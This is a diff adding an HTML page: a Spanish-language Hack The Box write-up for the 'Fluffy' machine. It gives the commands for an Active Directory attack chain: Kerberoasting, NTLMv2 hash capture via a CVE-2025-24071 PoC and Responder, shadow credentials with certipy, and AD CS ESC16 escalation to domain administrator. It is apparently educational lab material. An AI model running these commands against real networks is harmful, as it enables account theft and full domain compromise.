@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Writeup HTB Fluffy | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="../index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Navegación principal">
+        <a data-nav="inicio" href="../index.html">Inicio</a>
+        <a data-nav="writeups" href="../writeups.html">Writeups</a>
+        <a data-nav="scripts" href="../scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box · Active Directory</p>
+      <h1>Fluffy</h1>
+      <p class="headline">Kerberoasting, Shadow Credentials y AD CS ESC16</p>
+      <p class="meta">Dificultad: Media · Objetivo: Domain Admin</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+        <h2>Resumen técnico</h2>
+        <p>
+          El compromiso inicia con credenciales válidas de bajo privilegio para el dominio
+          <code>fluffy.htb</code>. A partir de esa identidad se ejecuta reconocimiento LDAP/SMB, se enumeran cuentas de
+          servicio y se evalúa Kerberoasting. Aunque los tickets TGS no se rompen inicialmente por diccionario, se descubre
+          un recurso compartido con un PDF interno que expone referencias de CVE aprovechables en el entorno.
+        </p>
+        <p>
+          Mediante la PoC de <code>CVE-2025-24071</code> se fuerza una autenticación SMB saliente y se captura un hash
+          NTLMv2 de <code>p.agila</code>, el cual sí se crackea. Con esa cuenta se explotan relaciones de grupos para
+          abusar de <code>shadow credentials</code> sobre cuentas de servicio, conseguir acceso WinRM y finalmente escalar
+          por <code>AD CS ESC16</code> hasta obtener autenticación como <code>administrator</code>.
+        </p>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>1) Enumeración inicial</h2>
+        <p>
+          El escaneo de puertos mostró un controlador de dominio típico: <code>53</code>, <code>88</code>,
+          <code>389</code>, <code>445</code>, <code>636</code>, <code>3268</code>, <code>3269</code> y
+          <code>9389</code>. La firma SMB confirmó dominio <code>fluffy.htb</code> y autenticación nula habilitada para
+          ciertas operaciones de descubrimiento.
+        </p>
+        <pre><code>nxc smb 10.129.28.13 -u j.fleischman -p 'J0elTHEM4n1990!'
+nxc ldap 10.129.28.13 -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/fluffy/fluffy-nmap.png" alt="Escaneo de puertos inicial de Fluffy" />
+          <figcaption class="writeup-caption">Resultados de puertos y servicios en el controlador de dominio.</figcaption>
+        </figure>
+        <p>
+          Se sincronizó la hora con el DC antes de pruebas Kerberos para evitar errores de reloj. Después se ejecutó
+          <code>rusthound-ce</code> para exportar JSON compatibles con BloodHound CE y visualizar relaciones de abuso.
+        </p>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>2) Hallazgo clave en SMB y captura de credenciales</h2>
+        <p>
+          En el recurso compartido <code>IT</code> se encontró <code>Upgrade_Notice.pdf</code> con referencias a CVEs.
+          La investigación condujo a un vector donde un archivo <code>.library-ms</code> empaquetado desencadena conexión
+          SMB automática durante el procesamiento del Explorador de Windows.
+        </p>
+        <pre><code>smbclient -U j.fleischman -L //fluffy.htb
+# subida del zip PoC al recurso SMB
+# escucha de hashes con responder en tun0</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/fluffy/fluffy-smb-it.png" alt="Recurso SMB IT y archivo Upgrade Notice" />
+          <figcaption class="writeup-caption">Acceso al recurso IT y archivo interno usado como pivote.</figcaption>
+        </figure>
+        <p>
+          La técnica permitió capturar hash NTLMv2 de <code>p.agila</code> y crackearlo con diccionario, obteniendo la
+          contraseña <code>prometheusx-303</code>.
+        </p>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/fluffy/fluffy-ntlmv2-crack.png" alt="Captura y crackeo de hash NTLMv2" />
+          <figcaption class="writeup-caption">Obtención de hash NTLMv2 y recuperación de credencial válida.</figcaption>
+        </figure>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>3) Abuso de grupos y Shadow Credentials</h2>
+        <p>
+          En BloodHound se validó que <code>p.agila</code> podía encadenar privilegios hacia cuentas de servicio. Se añadió
+          temporalmente al grupo <code>service accounts</code> y se explotó <code>certipy shadow auto</code> sobre
+          <code>winrm_svc</code> y <code>ca_svc</code> para obtener material de autenticación sin rotar contraseñas.
+        </p>
+        <pre><code>bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host 10.129.243.25 add groupMember 'service accounts' p.agila
+certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc
+evil-winrm -i 10.129.243.25 -u winrm_svc -H &lt;NTLM_HASH&gt;</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/fluffy/fluffy-bloodhound-path.png" alt="Ruta de ataque en BloodHound" />
+          <figcaption class="writeup-caption">Ruta de menor resistencia desde p.agila hacia cuentas de servicio.</figcaption>
+        </figure>
+      </section>
+
+      <section class="panel panel-large">
+        <h2>4) Escalada final con AD CS (ESC16)</h2>
+        <p>
+          Con acceso a <code>ca_svc</code> se enumeraron plantillas vulnerables y se aplicó la técnica ESC16. El flujo
+          consistió en modificar temporalmente UPN para solicitar un certificado con identidad privilegiada,
+          restaurar atributos y autenticar con el PFX emitido.
+        </p>
+        <pre><code>certipy find -username ca_svc -hashes :&lt;hash&gt; -dc-ip 10.129.243.25 -vulnerable
+certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.243.25 -user ca_svc -upn administrator update
+certipy req -u ca_svc -hashes :&lt;hash&gt; -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.243.25
+certipy auth -dc-ip 10.129.243.25 -pfx administrator.pfx -username administrator -domain fluffy.htb</code></pre>
+        <figure class="writeup-figure">
+          <img class="writeup-image" src="../src/images/writeups/fluffy/fluffy-esc16-admin.png" alt="Abuso AD CS ESC16 y autenticación como administrator" />
+          <figcaption class="writeup-caption">Cadena final con AD CS ESC16 hasta autenticación como administrator.</figcaption>
+        </figure>
+        <p>
+          Con el hash final de <code>administrator</code> se obtuvo sesión remota y control total del dominio.
+        </p>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="../writeups.html">Volver a writeups</a>
+    </footer>
+
+    <script type="module" src="../src/js/site.js"></script>
+  </body>
+</html>
